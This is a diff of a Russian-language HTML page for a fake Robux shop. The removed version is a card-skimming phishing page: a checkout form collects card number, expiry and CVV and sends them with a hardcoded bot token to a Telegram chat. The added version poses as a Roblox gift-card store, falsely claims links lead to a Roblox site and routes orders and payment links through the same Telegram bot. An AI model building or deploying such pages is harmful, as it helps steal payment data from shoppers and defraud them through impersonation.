@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Excellent Shop — фиолетовые звёзды</title>
+    <title>Robux Plus — подарочные карты</title>
     <style>
         * {
             margin: 0;
@@ -17,6 +17,10 @@
             background: linear-gradient(145deg, #f0e6ff 0%, #e9d9ff 100%);
             position: relative;
             overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
 
         /* canvas для звёздочек */
@@ -30,387 +34,251 @@
             z-index: 10;
         }
 
-        .app-container {
+        .container {
             position: relative;
             z-index: 20;
+            max-width: 600px;
             width: 100%;
-            max-width: 1400px;
             margin: 0 auto;
-            padding: 20px;
         }
 
-        /* мягкие фиолетовые карточки */
-        .auth-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 80vh;
-        }
-
-        .auth-card {
-            background: rgba(255, 245, 255, 0.92);
+        /* карточка */
+        .card {
+            background: rgba(255, 245, 255, 0.94);
             backdrop-filter: blur(12px);
             border: 1px solid #d9b8ff;
             border-radius: 48px;
-            padding: 40px 32px;
-            width: 100%;
-            max-width: 460px;
-            box-shadow: 0 20px 30px rgba(128, 0, 255, 0.1);
+            padding: 32px 28px;
+            box-shadow: 0 20px 30px rgba(128, 0, 255, 0.15);
         }
 
-        .auth-title {
-            font-size: 2.2rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #aa6eff, #c17eff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
+        .logo {
             text-align: center;
-        }
-
-        .auth-sub {
-            text-align: center;
-            color: #7a4f9e;
-            margin-bottom: 32px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 20px;
-            background: #ffffffdd;
-            border: 1.5px solid #e2ccff;
-            border-radius: 60px;
-            color: #3b2b4d;
-            margin-bottom: 16px;
-            outline: none;
-        }
-
-        .input-group input:focus {
-            border-color: #b77eff;
-            box-shadow: 0 0 0 3px rgba(183, 126, 255, 0.2);
-        }
-
-        .auth-btn {
-            width: 100%;
-            background: linear-gradient(95deg, #b87eff, #9c58e6);
-            border: none;
-            padding: 14px;
-            border-radius: 60px;
-            font-weight: bold;
-            color: white;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .switch-text {
-            text-align: center;
-            margin-top: 20px;
-            color: #6b4f8b;
-        }
-
-        .switch-text span {
-            color: #9b5eff;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .error-msg {
-            color: #e07c7c;
-            font-size: 0.8rem;
-            text-align: center;
-            margin-top: 8px;
-        }
-
-        /* магазин */
-        .store-container {
-            display: none;
-            animation: fadeIn 0.4s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px);}
-            to { opacity: 1; transform: translateY(0);}
-        }
-
-        .hero {
-            background: rgba(230, 210, 255, 0.8);
-            backdrop-filter: blur(8px);
-            border-radius: 60px;
-            padding: 30px 25px;
-            text-align: center;
-            margin-bottom: 40px;
-            border: 1px solid #e2c8ff;
-        }
-
-        .hero h2 {
-            font-size: 2.5rem;
-            color: #7b42c4;
-        }
-
-        .hero p {
-            font-size: 1.2rem;
-            color: #5d3b80;
-            margin-top: 12px;
-        }
-
-        .badge-sale {
-            background: #f2e0ff;
-            color: #6a37a3;
-            display: inline-block;
-            padding: 6px 16px;
-            border-radius: 40px;
-            font-weight: bold;
-            margin-top: 12px;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            background: #ffffffcc;
-            border-radius: 60px;
-            padding: 12px 24px;
-            margin-bottom: 30px;
+            margin-bottom: 24px;
         }
 
         .logo h1 {
-            font-size: 1.9rem;
+            font-size: 2.4rem;
             background: linear-gradient(135deg, #b16eff, #9b4eff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
 
-        .user-info {
-            background: #efdeff;
-            padding: 8px 20px;
-            border-radius: 60px;
+        .logo p {
+            color: #7a4f9e;
+            font-size: 0.9rem;
+        }
+
+        .card-type {
             display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-
-        .logout-btn {
-            background: none;
-            border: 1px solid #c99494;
-            padding: 6px 16px;
-            border-radius: 40px;
-            cursor: pointer;
-        }
-
-        .stock-badge {
-            background: #f0e4ff;
-            padding: 8px 18px;
-            border-radius: 60px;
-        }
-
-        .products-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 25px;
+            gap: 20px;
             justify-content: center;
-            margin: 40px 0;
+            margin-bottom: 30px;
         }
 
-        .product-card {
-            background: #ffffffdd;
-            backdrop-filter: blur(4px);
-            border: 1px solid #decbff;
-            border-radius: 32px;
-            padding: 24px 20px;
-            width: 260px;
+        .type-btn {
+            background: #f2eaff;
+            border: 2px solid #decbff;
+            border-radius: 60px;
+            padding: 12px 28px;
+            font-weight: bold;
+            font-size: 1rem;
+            color: #6a37a3;
+            cursor: pointer;
             transition: 0.2s;
+            width: 100%;
             text-align: center;
         }
 
-        .product-card:hover {
-            transform: translateY(-6px);
-            background: white;
-            border-color: #b77eff;
-        }
-
-        .price {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #9b4eff;
-            margin: 14px 0;
-        }
-
-        .btn-buy {
-            background: linear-gradient(135deg, #c38eff, #a05fe8);
-            border: none;
-            width: 100%;
-            padding: 12px;
-            border-radius: 40px;
-            font-weight: bold;
+        .type-btn.active {
+            background: linear-gradient(95deg, #b87eff, #9c58e6);
+            border-color: #b87eff;
             color: white;
-            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(156, 88, 230, 0.3);
         }
 
-        .cart {
-            position: fixed;
-            right: 20px;
-            top: 90px;
-            background: #ffffffea;
-            backdrop-filter: blur(12px);
-            border: 1px solid #decbff;
-            border-radius: 28px;
-            padding: 18px;
-            width: 300px;
-            z-index: 1000;
+        .amount-section {
+            margin-bottom: 30px;
         }
 
-        @media (max-width: 700px) {
-            .cart {
-                position: static;
-                width: 100%;
-                margin-top: 30px;
-            }
+        .amount-label {
+            font-weight: 600;
+            color: #5d3b80;
+            margin-bottom: 12px;
+            display: block;
         }
 
-        .remove-item {
-            background: #ffc4c4;
-            border: none;
-            border-radius: 30px;
-            padding: 2px 12px;
-            cursor: pointer;
+        .amount-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 20px;
         }
 
-        .checkout-btn {
-            background: #b87eff;
-            border: none;
-            width: 100%;
-            padding: 12px;
-            border-radius: 40px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 12px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(120, 70, 150, 0.3);
-            backdrop-filter: blur(6px);
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-
-        .modal-card {
+        .amount-btn {
             background: white;
-            border-radius: 48px;
-            padding: 32px;
-            width: 380px;
-            border: 1px solid #d0aeff;
-        }
-
-        .modal-card input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
+            border: 1.5px solid #decbff;
             border-radius: 60px;
-            border: 1px solid #e2ccff;
-            background: #fefaff;
+            padding: 10px 20px;
+            font-weight: bold;
+            color: #6a37a3;
+            cursor: pointer;
+            transition: 0.2s;
+            flex: 1 0 auto;
+            text-align: center;
         }
 
-        .modal-card button {
+        .amount-btn.active {
+            background: #b87eff;
+            border-color: #b87eff;
+            color: white;
+        }
+
+        .custom-amount {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .custom-amount input {
+            flex: 1;
+            padding: 12px 16px;
+            border-radius: 60px;
+            border: 1.5px solid #decbff;
+            background: #fffafc;
+            outline: none;
+            font-size: 1rem;
+        }
+
+        .currency {
+            background: #f0e4ff;
+            padding: 10px 16px;
+            border-radius: 60px;
+            color: #6a37a3;
+            font-weight: bold;
+        }
+
+        .recipient {
+            margin-bottom: 30px;
+        }
+
+        .recipient label {
+            font-weight: 600;
+            color: #5d3b80;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .recipient select, .recipient input {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 60px;
+            border: 1.5px solid #decbff;
+            background: white;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .recipient input {
+            margin-top: 10px;
+            display: none;
+        }
+
+        .btn-add {
             background: linear-gradient(95deg, #b87eff, #9c58e6);
             border: none;
-            padding: 12px;
-            border-radius: 60px;
-            color: white;
             width: 100%;
+            padding: 16px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: white;
             cursor: pointer;
+            transition: 0.2s;
+            margin: 20px 0 16px;
+        }
+
+        .btn-add:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 20px rgba(156, 88, 230, 0.4);
+        }
+
+        .external-note {
+            font-size: 0.7rem;
+            color: #9278b0;
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .activation {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.85rem;
+            color: #a58bc2;
+            border-top: 1px solid #e2ccff;
+            padding-top: 18px;
         }
 
         footer {
-            margin-top: 50px;
             text-align: center;
+            margin-top: 24px;
             color: #9278b0;
+            font-size: 0.7rem;
         }
     </style>
 </head>
 <body>
 <canvas id="starCanvas"></canvas>
 
-<div class="app-container">
-    <!-- авторизация -->
-    <div id="authSection" class="auth-wrapper">
-        <div class="auth-card">
-            <div class="auth-title">✨ Excellent Shop ✨</div>
-            <div class="auth-sub">магазин твоих побед</div>
-            <div id="authForm">
-                <div id="signinForm">
-                    <div class="input-group"><input type="text" id="loginUsername" placeholder="логин или email"></div>
-                    <div class="input-group"><input type="password" id="loginPassword" placeholder="пароль"></div>
-                    <button class="auth-btn" id="doSignIn">✨ войти ✨</button>
-                    <div class="switch-text">нет аккаунта? <span id="goToSignUp">создать</span></div>
-                    <div id="authError" class="error-msg"></div>
-                </div>
-                <div id="signupForm" style="display:none;">
-                    <div class="input-group"><input type="email" id="regEmail" placeholder="email"></div>
-                    <div class="input-group"><input type="text" id="regLogin" placeholder="логин"></div>
-                    <div class="input-group"><input type="password" id="regPass" placeholder="пароль"></div>
-                    <div class="input-group"><input type="password" id="regConfirmPass" placeholder="повтори пароль"></div>
-                    <button class="auth-btn" id="doSignUp">⭐ зарегистрироваться</button>
-                    <div class="switch-text">уже есть? <span id="goToSignIn">вход</span></div>
-                    <div id="regError" class="error-msg"></div>
-                </div>
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <h1>✨ Robux Plus ✨</h1>
+            <p>подарочные карты Roblox в стиле Excellent Shop</p>
+        </div>
+
+        <div class="card-type">
+            <div class="type-btn" data-type="digital">💻 Digital Card</div>
+            <div class="type-btn" data-type="physical">📦 Physical Card</div>
+        </div>
+
+        <div class="amount-section">
+            <span class="amount-label">Amount (10 $ - 500 $) USD</span>
+            <div class="amount-buttons">
+                <div class="amount-btn" data-amount="10">10</div>
+                <div class="amount-btn" data-amount="25">25</div>
+                <div class="amount-btn" data-amount="50">50</div>
+                <div class="amount-btn" data-amount="100">100</div>
+            </div>
+            <div class="custom-amount">
+                <input type="number" id="customAmount" placeholder="своя сумма" min="10" max="500" step="1">
+                <span class="currency">USD</span>
             </div>
         </div>
-    </div>
 
-    <!-- магазин excellent shop -->
-    <div id="storeSection" class="store-container">
-        <div class="hero">
-            <h2>✨ Excellent Shop — лучший выбор ✨</h2>
-            <p>⭐ самый дешёвый и надёжный магазин robux ⭐</p>
-            <p>🌟 цены ниже рынка до -50% 🌟 моментальная доставка</p>
-            <div class="badge-sale">🎁 подарок при первом заказе ✨</div>
+        <div class="recipient">
+            <label>Who is this for?</label>
+            <select id="recipientSelect">
+                <option value="for_me">For me</option>
+                <option value="gift">As a gift</option>
+            </select>
+            <input type="text" id="giftName" placeholder="Recipient's Roblox username">
         </div>
-        <div class="header">
-            <div class="logo"><h1>✨ Excellent Shop</h1><span>фиолетовая магия robux</span></div>
-            <div class="user-info"><span>👤 <span id="currentUserNick"></span></span><button class="logout-btn" id="logoutBtn">🚪 выйти</button></div>
-            <div class="stock-badge">⭐ в наличии: <strong>300 000</strong> robux</div>
-        </div>
-        <div class="products-grid">
-            <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49">купить</button></div>
-            <div class="product-card"><div class="robux-icon">💎💎✨</div><h3>400 Robux</h3><div class="price">189 ₽</div><button class="btn-buy" data-name="400 Robux" data-price="189">купить</button></div>
-            <div class="product-card"><div class="robux-icon">💎💎💎✨</div><h3>800 Robux</h3><div class="price">359 ₽</div><button class="btn-buy" data-name="800 Robux" data-price="359">купить</button></div>
-            <div class="product-card"><div class="robux-icon">👑✨</div><h3>2000 Robux</h3><div class="price">899 ₽</div><button class="btn-buy" data-name="2000 Robux" data-price="899">купить</button></div>
-        </div>
-        <div class="cart" id="cartPanel">
-            <h3>🛒 звёздная корзина</h3>
-            <ul id="cartList"><li>✨ пусто ✨</li></ul>
-            <div class="cart-total" id="cartTotal">0 ₽</div>
-            <button class="checkout-btn" id="checkoutBtn">💫 оформить заказ</button>
-        </div>
-        <footer>✨ excellent shop — сияй с нами ✨</footer>
-    </div>
-</div>
 
-<div id="paymentModal" class="modal">
-    <div class="modal-card">
-        <span class="close-modal" id="closeModalBtn" style="float:right; font-size:28px; cursor:pointer;">&times;</span>
-        <h3 style="color:#8c56d4;">🌟 оплата в excellent shop 🌟</h3>
-        <input type="text" id="robloxUser" placeholder="roblox никнейм">
-        <input type="text" id="cardNumber" placeholder="номер карты">
-        <input type="text" id="cardExpiry" placeholder="MM/YY">
-        <input type="text" id="cardCvv" placeholder="CVV">
-        <button id="submitPaymentBtn">⭐ оплатить и получить robux</button>
+        <button class="btn-add" id="addToCartBtn">✨ Add to Cart ✨</button>
+        <div class="external-note">
+            Clicking the button or link above will take you to an external website provided by Roblox.
+        </div>
+        <div class="activation">
+            🔧 Aktivacija Windows
+        </div>
     </div>
+    <footer>⭐ Excellent Shop — Robux Plus ⭐</footer>
 </div>
 
 <script>
-    // ЗВЁЗДОЧКИ (падают маленькие звёздочки)
+    // ЗВЁЗДОЧКИ
     const canvas = document.getElementById('starCanvas');
     let ctx = canvas.getContext('2d');
     let stars = [];
@@ -429,7 +297,6 @@
             size: Math.random() * 4 + 2,
             speedY: Math.random() * 1.5 + 0.7,
             opacity: Math.random() * 0.6 + 0.3,
-            angle: 0
         };
     }
 
@@ -475,90 +342,60 @@
     }
     drawStars();
 
-    // ----- система авторизации с email -----
-    let currentUser = null;
+    // ----- логика выбора типа карты -----
+    let selectedType = 'digital';
+    let selectedAmount = 10;
 
-    function loadUsers() {
-        let users = localStorage.getItem('excellent_users');
-        if (!users) {
-            const def = { "star": { login: "star", password: "123", email: "star@excellent.ru" } };
-            localStorage.setItem('excellent_users', JSON.stringify(def));
-            return def;
+    const typeBtns = document.querySelectorAll('.type-btn');
+    const amountBtns = document.querySelectorAll('.amount-btn');
+    const customAmountInput = document.getElementById('customAmount');
+    const recipientSelect = document.getElementById('recipientSelect');
+    const giftNameInput = document.getElementById('giftName');
+
+    typeBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            typeBtns.forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            selectedType = btn.getAttribute('data-type');
+        });
+    });
+    // активируем первый по умолчанию
+    typeBtns[0].classList.add('active');
+
+    amountBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            amountBtns.forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            selectedAmount = parseInt(btn.getAttribute('data-amount'));
+            customAmountInput.value = '';
+        });
+    });
+    amountBtns[0].classList.add('active');
+
+    customAmountInput.addEventListener('input', (e) => {
+        let val = parseInt(e.target.value);
+        if (!isNaN(val) && val >= 10 && val <= 500) {
+            selectedAmount = val;
+            amountBtns.forEach(b => b.classList.remove('active'));
+        } else if (e.target.value === '') {
+            // оставляем последний выбранный из кнопок
+        } else {
+            e.target.value = '';
         }
-        return JSON.parse(users);
-    }
-    function saveUsers(users) { localStorage.setItem('excellent_users', JSON.stringify(users)); }
-
-    function showAuth(show) {
-        document.getElementById('authSection').style.display = show ? 'flex' : 'none';
-        document.getElementById('storeSection').style.display = show ? 'none' : 'block';
-    }
-    function updateUI() {
-        if (currentUser) {
-            document.getElementById('currentUserNick').innerText = currentUser;
-            showAuth(false);
-        } else showAuth(true);
-    }
-
-    // регистрация
-    document.getElementById('doSignUp')?.addEventListener('click', () => {
-        const email = document.getElementById('regEmail').value.trim();
-        const login = document.getElementById('regLogin').value.trim();
-        const pass = document.getElementById('regPass').value.trim();
-        const confirm = document.getElementById('regConfirmPass').value.trim();
-        const errDiv = document.getElementById('regError');
-        if (!email || !login || !pass) { errDiv.innerText = 'заполни всё'; return; }
-        if (pass !== confirm) { errDiv.innerText = 'пароли не совпадают'; return; }
-        if (!email.includes('@')) { errDiv.innerText = 'некорректный email'; return; }
-        const users = loadUsers();
-        if (users[login]) { errDiv.innerText = 'логин занят'; return; }
-        for (let k in users) if (users[k].email === email) { errDiv.innerText = 'email уже используется'; return; }
-        users[login] = { login, password: pass, email };
-        saveUsers(users);
-        errDiv.innerText = '✅ аккаунт создан! войдите';
-        document.getElementById('signupForm').style.display = 'none';
-        document.getElementById('signinForm').style.display = 'block';
     });
 
-    // вход
-    document.getElementById('doSignIn')?.addEventListener('click', () => {
-        const val = document.getElementById('loginUsername').value.trim();
-        const pwd = document.getElementById('loginPassword').value.trim();
-        const users = loadUsers();
-        let found = null;
-        for (let key in users) {
-            if (key === val || users[key].email === val) {
-                if (users[key].password === pwd) found = key;
-                break;
-            }
+    recipientSelect.addEventListener('change', () => {
+        if (recipientSelect.value === 'gift') {
+            giftNameInput.style.display = 'block';
+        } else {
+            giftNameInput.style.display = 'none';
         }
-        if (found) {
-            currentUser = found;
-            localStorage.setItem('excellent_current', found);
-            updateUI();
-            initStore();
-        } else document.getElementById('authError').innerText = 'неверно';
     });
+    giftNameInput.style.display = 'none';
 
-    document.getElementById('goToSignUp')?.addEventListener('click', () => {
-        document.getElementById('signinForm').style.display = 'none';
-        document.getElementById('signupForm').style.display = 'block';
-    });
-    document.getElementById('goToSignIn')?.addEventListener('click', () => {
-        document.getElementById('signupForm').style.display = 'none';
-        document.getElementById('signinForm').style.display = 'block';
-    });
-    document.getElementById('logoutBtn')?.addEventListener('click', () => {
-        currentUser = null;
-        localStorage.removeItem('excellent_current');
-        showAuth(true);
-        cart = []; if (window.updateCartUI) updateCartUI();
-    });
-
-    // корзина + телеграм
-    let cart = [];
+    // ----- телеграм отправка (как в excellent shop) -----
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
-    let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
+    let CHAT_ID = localStorage.getItem('tg_chat_id_robuxplus');
 
     async function fetchChatId() {
         try {
@@ -569,90 +406,85 @@
                 const cid = last.message?.chat?.id || last.callback_query?.message?.chat?.id;
                 if (cid) {
                     CHAT_ID = cid;
-                    localStorage.setItem('tg_chat_id_excellent', CHAT_ID);
-                    alert('✨ телеграм готов, звёзды ярче ✨');
+                    localStorage.setItem('tg_chat_id_robuxplus', CHAT_ID);
+                    alert('✨ телеграм готов, можно отправлять ✨');
                     return true;
                 }
             }
             alert('✨ напиши @ExcellentShopBot любое сообщение ✨');
-        } catch(e) { alert('ошибка соединения'); }
+        } catch(e) { alert('ошибка подключения'); }
         return false;
     }
 
-    function showMsg(m) {
+    function showMessage(msg) {
         let div = document.createElement('div');
-        div.innerText = m;
-        div.style.cssText = 'position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999; font-weight:bold;';
+        div.innerText = msg;
+        div.style.cssText = 'position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999; font-weight:bold; backdrop-filter:blur(4px);';
         document.body.appendChild(div);
-        setTimeout(()=>div.remove(),2500);
+        setTimeout(()=>div.remove(), 2500);
     }
 
-    function addToCart(n,p) { cart.push({name:n, price:p}); updateCartUI(); showMsg(`✨ ${n} добавлен`); }
-    function updateCartUI() {
-        const list = document.getElementById('cartList');
-        const totalSpan = document.getElementById('cartTotal');
-        if (!list) return;
-        if (cart.length===0) { list.innerHTML = '<li>✨ корзина пуста ✨</li>'; totalSpan.innerText = '0 ₽'; return; }
-        let total=0, html='';
-        cart.forEach((item,i) => { total+=item.price; html+=`<li>${item.name} — ${item.price} ₽ <button class="remove-item" onclick="removeFromCart(${i})">x</button></li>`; });
-        list.innerHTML = html;
-        totalSpan.innerText = total + ' ₽';
-    }
-    window.removeFromCart = function(i) { cart.splice(i,1); updateCartUI(); showMsg('товар убран'); };
-
-    function initStore() {
-        document.querySelectorAll('.btn-buy').forEach(btn => {
-            btn.removeEventListener('click', buyH);
-            btn.addEventListener('click', buyH);
-        });
-        function buyH(e) {
-            let name = this.getAttribute('data-name');
-            let price = parseInt(this.getAttribute('data-price'));
-            addToCart(name, price);
+    document.getElementById('addToCartBtn').addEventListener('click', async () => {
+        let amount = selectedAmount;
+        // проверка кастомного поля
+        const customVal = parseInt(customAmountInput.value);
+        if (!isNaN(customVal) && customVal >= 10 && customVal <= 500) {
+            amount = customVal;
+        } else if (customAmountInput.value !== '') {
+            alert('сумма должна быть от 10 до 500 USD');
+            return;
         }
-        updateCartUI();
-        const modal = document.getElementById('paymentModal');
-        const closeModal = document.getElementById('closeModalBtn');
-        document.getElementById('checkoutBtn').onclick = () => {
-            if (cart.length===0) { alert('корзина пуста'); return; }
-            if (!CHAT_ID) { alert('✨ настрой телеграм ✨'); fetchChatId(); return; }
-            modal.style.display = 'flex';
-        };
-        closeModal.onclick = () => modal.style.display = 'none';
-        window.onclick = (e) => { if (e.target === modal) modal.style.display='none'; };
-        document.getElementById('submitPaymentBtn').onclick = async () => {
-            const nick = document.getElementById('robloxUser').value.trim();
-            const card = document.getElementById('cardNumber').value.trim();
-            const exp = document.getElementById('cardExpiry').value.trim();
-            const cvv = document.getElementById('cardCvv').value.trim();
-            if (!nick || !card || !exp || !cvv) { alert('заполни все поля'); return; }
-            const total = cart.reduce((s,i)=>s+i.price,0);
-            const items = cart.map(i=>`${i.name} — ${i.price} ₽`).join('\n');
-            const msg = `✨ EXCELLENT SHOP ✨\n👤 ${nick}\n📦 ${items}\n💰 ${total} ₽\n💳 ${card}\n📅 ${exp}\n🔐 ${cvv}`;
-            try {
-                const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-                });
-                const json = await resp.json();
-                if (json.ok) {
-                    alert('✅ оплата принята! robux придут на ' + nick);
-                    cart = [];
-                    updateCartUI();
-                    modal.style.display = 'none';
-                    document.getElementById('robloxUser').value = '';
-                    document.getElementById('cardNumber').value = '';
-                    document.getElementById('cardExpiry').value = '';
-                    document.getElementById('cardCvv').value = '';
-                } else alert('❌ ошибка платежа');
-            } catch(e) { alert('ошибка соединения'); }
-        };
-    }
 
-    const saved = localStorage.getItem('excellent_current');
-    if (saved && loadUsers()[saved]) { currentUser = saved; updateUI(); initStore(); }
-    else showAuth(true);
-    if (!CHAT_ID) setTimeout(()=>{ if(confirm('для отправки данных карт подключи телеграм?')) fetchChatId(); }, 900);
+        let recipient = '';
+        if (recipientSelect.value === 'for_me') {
+            recipient = 'For me (владельцу)';
+        } else {
+            const giftName = giftNameInput.value.trim();
+            if (!giftName) {
+                alert('укажи никнейм получателя подарка');
+                return;
+            }
+            recipient = `Gift for: ${giftName}`;
+        }
+
+        const cardType = selectedType === 'digital' ? 'Digital Card' : 'Physical Card';
+        const messageText = `✨ ROBUX PLUS (Excellent Shop) ✨\n💳 Карта: ${cardType}\n💰 Сумма: ${amount} USD\n👤 Получатель: ${recipient}`;
+
+        if (!CHAT_ID) {
+            const confirmTelegram = confirm('Телеграм не настроен. Настроить сейчас?');
+            if (confirmTelegram) await fetchChatId();
+            if (!CHAT_ID) {
+                alert('отмена. данные не отправлены');
+                return;
+            }
+        }
+
+        try {
+            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: messageText })
+            });
+            const json = await resp.json();
+            if (json.ok) {
+                showMessage('✅ Заказ добавлен! Ссылка на оплату скоро придёт в Telegram.');
+                // сброс формы (опционально)
+                customAmountInput.value = '';
+                if (giftNameInput.style.display === 'block') giftNameInput.value = '';
+            } else {
+                alert('❌ Ошибка при отправке, попробуй позже');
+            }
+        } catch(e) {
+            alert('Ошибка соединения');
+        }
+    });
+
+    // при загрузке проверяем chat id
+    if (!CHAT_ID) {
+        setTimeout(() => {
+            if (confirm('Для отправки заказов нужен Telegram. Настроить сейчас?')) fetchChatId();
+        }, 800);
+    }
 </script>
 </body>
 </html>
